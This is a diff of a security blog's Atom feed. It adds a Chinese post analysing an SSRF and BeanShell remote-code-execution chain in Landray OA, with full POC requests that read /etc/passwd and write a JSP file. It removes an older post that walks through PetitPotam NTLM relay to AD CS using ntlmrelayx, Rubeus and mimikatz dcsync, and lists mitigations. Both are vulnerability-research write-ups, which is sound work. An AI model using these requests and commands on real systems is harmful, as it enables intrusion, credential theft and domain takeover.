@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2022-02-19T05:45:14.021Z</updated>
+  <updated>2022-03-03T11:55:49.382Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>蓝凌OA前台SSRF+dataxml.jsp RCE漏洞分析</title>
+    <link href="http://422926799.github.io/posts/980cff8b.html"/>
+    <id>http://422926799.github.io/posts/980cff8b.html</id>
+    <published>2022-03-03T11:39:28.000Z</published>
+    <updated>2022-03-03T11:55:49.382Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>漏洞路径:/sys/ui/extend/varkind/custom.jsp<br><img src="https://s4.ax1x.com/2022/03/03/btekb6.png" alt=""></p><pre><code>&lt;c:import&gt;标签提供了所有&lt;jsp:include&gt;行为标签所具有的功能，同时也允许包含绝对URL。举例来说，使用&lt;c:import&gt;标签可以包含一个FTP服务器中不同的网页内容。url：待导入资源的URL，可以是相对路径和绝对路径，并且可以导入其他主机资源&lt;c:param&gt; 标签用于在 &lt;c:url&gt; 标签中指定参数，而且与 URL 编码相关。在 &lt;c:param&gt; 标签内，name 属性表明参数的名称，value 属性表明参数的值。</code></pre><p>利用SSRF读文件</p><pre><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: 1.1.1.1Content-Length: 42Pragma: no-cacheCache-Control: no-cacheOrigin: http://1.1.1.1Upgrade-Insecure-Requests: 1DNT: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://1.1.1.1/sys/ui/extend/varkind/custom.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=060EB9D7EC3DA6E910B89F3D67BAB52CConnection: closevar={&quot;body&quot;:{&quot;file&quot;:&quot;file:///etc/passwd&quot;}}</code></pre><p><img src="https://s4.ax1x.com/2022/03/03/bteRz9.png" alt=""></p><h2 id="利用dataxml-jsp任意执行代码"><a href="#利用dataxml-jsp任意执行代码" class="headerlink" title="利用dataxml.jsp任意执行代码"></a>利用dataxml.jsp任意执行代码</h2><p>参考链接:<a href="https://websecuritys.cn/archives/lanling2.html" target="_blank" rel="noopener">https://websecuritys.cn/archives/lanling2.html</a><br><a href="https://blog.csdn.net/ouyang111222/article/details/48474189" target="_blank" rel="noopener">https://blog.csdn.net/ouyang111222/article/details/48474189</a></p><p>POC</p><pre><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: 127.0.0.1User-Agent: Go-http-client/1.1Content-Length: 526Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipvar={&quot;body&quot;:{&quot;file&quot;:&quot;/sys/common/dataxml.jsp&quot;}}&amp;s_bean=sysFormulaValidate&amp;script=import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(&quot;bsh.Interpreter&quot;);String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(&quot;WEB-INF&quot;)[0]%2B&quot;/loginx.jsp&quot;);f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(&quot;aGVsbG8=&quot;));fout.close();&amp;type=int&amp;modelName=test</code></pre><p>获取s_bean参数值做分割然后进入循环调用getBean函数(getBean获取实例化的bean的id或者name，定义在xml文件)，最后调用getDataList函数传入RequestContext<br><img src="https://s4.ax1x.com/2022/03/03/btejsI.png" alt=""></p><p>s_bean=sysFormulaValidate，搜索sysFormulaValidate<br><img src="https://s4.ax1x.com/2022/03/03/btmCFS.png" alt=""></p><p>在spring.xml可以看见<br><img src="https://s4.ax1x.com/2022/03/03/btmFzj.md.png" alt=""></p><p>找到对应的jar包，对着getDataList按两下shift。定位到IXMLDataBean.class<br><img src="https://s4.ax1x.com/2022/03/03/btmAQs.png" alt=""></p><p>找到接口<br><img src="https://s4.ax1x.com/2022/03/03/btmee0.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btmKFU.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btm3l9.png" alt=""></p><p>可以看到先获取了script参数，然后调用parseValueScript函数<br><img src="https://s4.ax1x.com/2022/03/03/btmaFO.png" alt=""></p><p>继续往下跟<br><img src="https://s4.ax1x.com/2022/03/03/btmr6A.png" alt=""></p><p>首先判断了script是否为NULL，不为NULL去结尾去特殊字符和空格。然后判断是否存在$，如果存在则进入while循环去除$<br><img src="https://s4.ax1x.com/2022/03/03/btmsOI.md.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btmgTf.png" alt=""></p><p>最后拼接，然后调用interpreter.eval()<br>bsh(BeanShell)动态执行java代码：<a href="https://blog.csdn.net/ouyang111222/article/details/48474189" target="_blank" rel="noopener">https://blog.csdn.net/ouyang111222/article/details/48474189</a><br><img src="https://s4.ax1x.com/2022/03/03/btmoXn.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btn0EV.png" alt=""></p><p>利用写文件 getshell</p><pre><code>import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(&quot;bsh.Interpreter&quot;);String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(&quot;WEB-INF&quot;)[0]%2B&quot;/loginx.jsp&quot;);f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(&quot;aGVsbG8=&quot;));fout.close();</code></pre><p>为什么loginxx.jsp访问是200,spring.xml允许匿名访问的如下<br><img src="https://s4.ax1x.com/2022/03/03/btuSPS.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;SSRF漏洞&quot;&gt;&lt;a href=&quot;#SSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞&quot;&gt;&lt;/a&gt;SSRF漏洞&lt;/h2&gt;&lt;p&gt;漏洞路径:/sys/ui/extend/varkind/custom.jsp&lt;br&gt;&lt;img src=&quot;ht</summary>
+      
+    
+    
+    
+    
+    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
+    
+  </entry>
   
   <entry>
     <title>向日葵RCE漏洞复现分析</title>
@@ -434,31 +456,6 @@
       
     <summary type="html">&lt;p&gt;七夕放首老婆的歌&lt;/p&gt;
 &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/p</summary>
-      
-    
-    
-    
-    
-    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>使用PetitPotam到NTLM中继到域管理员</title>
-    <link href="http://422926799.github.io/posts/d55c75ac.html"/>
-    <id>http://422926799.github.io/posts/d55c75ac.html</id>
-    <published>2021-08-07T11:57:32.000Z</published>
-    <updated>2021-08-07T12:47:46.460Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>最近披露的几个漏洞，分别是：</p><ul><li>MS-EFSRPC – 又名 PetitPotam</li><li>滥用 AD CS 角色的凭证中继<br>任何具有内部网络访问权限的攻击者（例如网络中的网络钓鱼客户端或恶意植入设备）都可以在没有任何初始凭据的情况下接管整个 Active Directory 域。当前在默认配置中，域控制器和 AD CS 容易受到这种攻击。<br>当 PetitPotam 被利用并将 NTLM 凭据中继到 Active Directory 证书服务时，攻击者无需事先对域进行任何身份验证即可获得域管理员权限。本文将详细介绍漏洞利用所需的步骤，然后介绍 PetitPotam 的缓解措施。<br>攻击者可以使用 PetitPotam 触发域控制器以将 NTLM 凭据中继到所选主机。然后可以将域控制器的 NTLM 凭据中继到 Active Directory 证书服务 (AD CS) Web 注册页面，并且可以注册 DC 证书。然后可以使用此证书来请求 TGT（票证授予票证）并通过 Pass-The-Ticket 破坏整个域。<br>AD CS（Active Directory 证书服务）特别有趣，因为<strong>它提供默认接受基于 NTLM 的身份验证的角色服务。这些服务具体包括证书颁发机构 Web 注册和证书注册 Web 服务。</strong></li></ul></blockquote><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>这几天踩的坑点：不能在DC安装AD证书服务进行测试，必须分开安装，具体情况是反射自身出问题还是什么不知道<br>DC: Windows Server 2019  IP:192.168.93.246<br>AD CS(证书服务器):Windows Server 2008 IP:192.168.93.141<br>Attack Kali IP:192.168.93.133</p><p>准备的工具:</p><ul><li>Rubeus 1.6.4</li><li>mimikatz</li><li>impacket分支(ntlmrelayx-adcs-attack)</li></ul><p>环境搭建过程：<br>（由小离提供的教程）<br><a href="https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf" target="_blank" rel="noopener">https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf</a></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>证书注册 Web 界面，通过安装证书颁发机构 Web 注册角色。作为在http://<adcsserver>/certsrv/ 上运行的 IIS 托管的 ASP Web 注册应用程序公开</adcsserver></li><li>证书注册服务 (CES)，通过安装证书注册 Web 服务角色。通过安装证书注册策略 Web 服务角色，与证书注册策略 (CEP) Web 服务协同工作。白皮书中的详细信息。</li><li>网络设备注册服务 (NDES)，通过安装网络设备注册服务 角色。作为白皮书中描述的一系列接口公开。</li><li>注册 HTTP 端点没有启用 HTTPS/没有启用任何 NTLM 中继保护（默认允许NTLM）</li><li>GPO 禁用 NTLM 身份验证或将关联的 IIS 应用程序配置为仅接受 Kerberos 身份验证</li></ul><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>使用 PetitPotam 触发从域控制器到侦听器的 NTLM 身份验证（运行响应程序或 ntlmrelayx）</li><li>使用 ntlmrelayx 使用“KerberosAuthentication”或“DomainControllers”AD CS 模板将 DC 的凭据中继到启用了 Web 注册（必须启用 NTLM 身份验证并默认启用）的 AD CS（Active Directory 证书服务）服务器。</li><li>获取通过NTLM中继获取的Base64 PKCS12证书</li><li>使用Base64 PKCS12 cert导入Kekeo请求TGT（Ticket Granting Ticket）</li><li>使用 mimikatz 为选择的用户（管理员、Krbtgt 等）转储 LSA 机密</li><li>记下域管理员用户的 NT 哈希值</li><li>使用 wmiexec 以该用户身份获得对域控制器的执行并执行 NT 哈希的哈希传递</li></ol><p>前三步流程图<br><img src="https://z3.ax1x.com/2021/08/07/fMckuT.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>下载新版impacket切换到ntlmrelayx-adcs-attack分支</p><pre><code>git clone https://github.com/ExAndroidDev/impacket.git # Clone the custom ntlmrelayx repocd impacketgit checkout ntlmrelayx-adcs-attack # checkout to the right branch - this caught me outsudo pip3 install -r requirements.txtsudo python3 setup.py install</code></pre><p>开启监听</p><pre><code>sudo python3 ntlmrelayx.py -debug -smb2support --target http://192.168.93.246/certsrv/certfnsh.asp --adcs --template DomainController</code></pre><p>注：这里模板必须要用DomainController，否则出现以下问题<br><img src="https://z3.ax1x.com/2021/08/07/fMgCIH.jpg" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgwFJ.png" alt="开启监听"></p><p>证书机器执行</p><pre><code>PetitPotam.exe &lt;Attack_IP&gt; &lt;DC_IP&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fMgfFH.png" alt="（执行后在监听那边可以收到base64，这里可能不会出现Attack Sucess关键字但还是成功的）"></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgLTg.png" alt=""></p><p>利用Rubeus获取TGT导入到当前进程</p><pre><code>Rubeus.exe asktgt /outfile:kirbi /user:WIN-0ASLVBO5ID9$ /ptt /certificate:&lt;Base64&gt; #这里的/user为/user:&lt;DC的机器名&gt;$</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2fBT.png" alt=""></p><p>利用mimikatz导出域管哈希</p><pre><code>lsadump::dcsync /user:Administrator</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2IN4.png" alt=""></p><p>wmicexec.py连接即可<br><img src="https://z3.ax1x.com/2021/08/07/fMRPgI.png" alt=""></p><p>或者也可以dump krbtgt的hash生成金票<br><img src="https://z3.ax1x.com/2021/08/07/fMRADf.png" alt=""></p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>IIS关闭NTLM验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRK8s.png" alt=""></p><p>只允许kerberos验证<br><img src="https://z3.ax1x.com/2021/08/07/fMR1K0.png" alt=""></p><p>GPO关闭NTLM身份验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRJVU.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/" target="_blank" rel="noopener">https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/</a><br><a href="https://www.youtube.com/watch?v=K0N90sI_GhI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=K0N90sI_GhI</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;最近披露的几个漏洞，分别是：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;MS-EFSRPC – 又名 PetitPotam&lt;/li</summary>
       
     
     
